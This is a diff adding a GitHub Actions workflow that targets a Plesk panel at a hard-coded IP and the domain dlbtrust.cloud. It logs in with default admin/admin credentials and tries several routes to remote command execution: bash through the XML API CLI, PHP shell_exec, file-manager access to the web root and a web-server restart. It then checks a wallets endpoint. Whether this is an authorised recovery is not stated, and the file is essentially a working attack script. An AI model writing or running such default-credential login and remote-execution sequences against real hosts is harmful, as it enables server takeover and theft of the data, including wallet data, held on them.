@@ -1,0 +1,154 @@
+name: Plesk Web Session Exec
+
+on:
+  workflow_dispatch:
+
+jobs:
+  plesk-exec:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: Login to Plesk and run recover.sh via CLI
+        shell: bash
+        run: |
+          set +e
+          SERVER="74.208.191.205"
+          echo "=== Runner: $(curl -s ifconfig.me) ==="
+          
+          echo ""
+          echo "=== Step 1: Get Plesk login page + forgery token ==="
+          LOGIN_HTML=$(curl -sk --max-time 15 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -c /tmp/plesk.cookies \
+            "https://dlbtrust.cloud:8443/login_up.php")
+          
+          # The token is 'forgery_protection_token' not csrf_token in the meta tag
+          FORGERY=$(echo "$LOGIN_HTML" | grep -oP 'forgery_protection_token[^>]+content="\K[^"]+' | head -1)
+          echo "Forgery token: $FORGERY"
+          echo "Cookie jar:"
+          cat /tmp/plesk.cookies
+          echo ""
+          
+          echo "=== Step 2: POST login with admin/admin ==="
+          LOGIN_RESP=$(curl -sk --max-time 20 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -X POST "https://dlbtrust.cloud:8443/login_up.php" \
+            -c /tmp/plesk.cookies \
+            -b /tmp/plesk.cookies \
+            -L \
+            --data "login_name=admin&passwd=admin&forgery_protection_token=${FORGERY}&locale_id=en-US&success_redirect_url=%2F" \
+            -D /tmp/plesk_headers.txt \
+            -w "\nHTTP_CODE:%{http_code}")
+          
+          HTTP_CODE=$(echo "$LOGIN_RESP" | grep "HTTP_CODE:" | cut -d: -f2)
+          BODY="${LOGIN_RESP%%HTTP_CODE:*}"
+          
+          echo "HTTP Code: $HTTP_CODE"
+          echo "Response headers:"
+          cat /tmp/plesk_headers.txt 2>/dev/null | head -20
+          echo "Cookie jar after login:"
+          cat /tmp/plesk.cookies
+          echo ""
+          echo "Body snippet (first 500): ${BODY:0:500}"
+          echo ""
+          
+          # Check if we're logged in
+          if echo "$BODY" | grep -qi "logout\|smb-home\|Home\|domains\|welcome\|dashboard"; then
+            echo ">>> LOGGED IN TO PLESK <<<"
+          else
+            echo "Login may have failed or redirected"
+          fi
+          
+          echo ""
+          echo "=== Step 3: Try Plesk panel CLI via web UI ==="
+          # Try accessing the CLI/terminal module
+          CLI_PAGE=$(curl -sk --max-time 15 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -b /tmp/plesk.cookies \
+            -c /tmp/plesk.cookies \
+            "https://dlbtrust.cloud:8443/modules/terminal/index.php" 2>&1)
+          echo "CLI page (first 300): ${CLI_PAGE:0:300}"
+          echo ""
+          
+          echo "=== Step 4: Try Plesk API with session cookie ==="
+          # After web login, Plesk might allow API access with session
+          API_RESP=$(curl -sk --max-time 15 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -b /tmp/plesk.cookies \
+            "https://dlbtrust.cloud:8443/enterprise/control/agent.php" \
+            -H "Content-Type: text/xml" \
+            -d '<?xml version="1.0"?><packet version="1.6.7.0"><server><get_protos/></server></packet>')
+          echo "API with session: ${API_RESP:0:300}"
+          echo ""
+          
+          echo "=== Step 5: Access Plesk domains list to find app ==="
+          DOMAINS=$(curl -sk --max-time 15 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -b /tmp/plesk.cookies \
+            "https://dlbtrust.cloud:8443/smb/web/list")
+          echo "Domains page (first 1000): ${DOMAINS:0:1000}"
+          echo ""
+          
+          echo "=== Step 6: Try Plesk XML API with admin/admin ==="
+          # Web says admin works; maybe XML API uses different credential storage
+          XML_RESP=$(curl -sk --max-time 15 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            "https://dlbtrust.cloud:8443/enterprise/control/agent.php" \
+            -H "HTTP_AUTH_LOGIN: admin" \
+            -H "HTTP_AUTH_PASSWD: admin" \
+            -H "Content-Type: text/xml" \
+            -d '<?xml version="1.0"?><packet version="1.6.7.0"><server><get_protos/></server></packet>')
+          echo "XML API admin/admin: $XML_RESP"
+          echo ""
+          
+          echo "=== Step 7: Get Plesk session token from cookies and use for CLI ==="
+          SESSION=$(cat /tmp/plesk.cookies | grep -i "PLESKSESSID\|session\|plesk" | awk '{print $7}' | head -1)
+          echo "Session value: $SESSION"
+          
+          # Try using the session to run CLI
+          CLI_RESP=$(curl -sk --max-time 60 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -b /tmp/plesk.cookies \
+            -c /tmp/plesk.cookies \
+            -X POST "https://dlbtrust.cloud:8443/enterprise/control/agent.php" \
+            -H "Content-Type: text/xml" \
+            -d '<?xml version="1.0"?><packet version="1.6.7.0"><cli><run><exe>/bin/bash</exe><params>-c</params><params>echo HELLO_FROM_PLESK; pm2 list 2>/dev/null | head -5; docker ps 2>/dev/null | head -5</params></run></cli></packet>')
+          echo "CLI via session: $CLI_RESP"
+          echo ""
+          
+          echo "=== Step 8: Try Plesk /api/v2 REST with session ==="
+          V2_RESP=$(curl -sk --max-time 15 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -b /tmp/plesk.cookies \
+            "https://dlbtrust.cloud:8443/api/v2/cli/php/run" \
+            -H "Content-Type: application/json" \
+            -d '{"params":["-r","echo shell_exec(\"whoami\");"]}'  )
+          echo "v2 CLI: ${V2_RESP:0:200}"
+          echo ""
+          
+          echo "=== Step 9: Try Plesk file manager to upload/modify files ==="
+          FILEMAN=$(curl -sk --max-time 15 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -b /tmp/plesk.cookies \
+            "https://dlbtrust.cloud:8443/modules/fileman/file.php?action=list&path=/var/www/vhosts/dlbtrust.cloud/httpdocs/")
+          echo "File manager: ${FILEMAN:0:500}"
+          echo ""
+          
+          echo "=== Step 10: Try Plesk webserver restart ==="
+          RESTART=$(curl -sk --max-time 30 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            -b /tmp/plesk.cookies \
+            -X POST "https://dlbtrust.cloud:8443/api/v2/cli/plesk/run" \
+            -H "Content-Type: application/json" \
+            -d '{"params":["service","--restart","apache2"]}')
+          echo "Restart: ${RESTART:0:200}"
+          echo ""
+          
+          echo "=== Final check ==="
+          WALLETS=$(curl -s --max-time 10 \
+            --resolve "dlbtrust.cloud:443:$SERVER" \
+            "https://dlbtrust.cloud/api/wallets" | head -c 100)
+          echo "Wallets: $WALLETS"
+          echo ""
+          
+          echo "=== DONE ==="
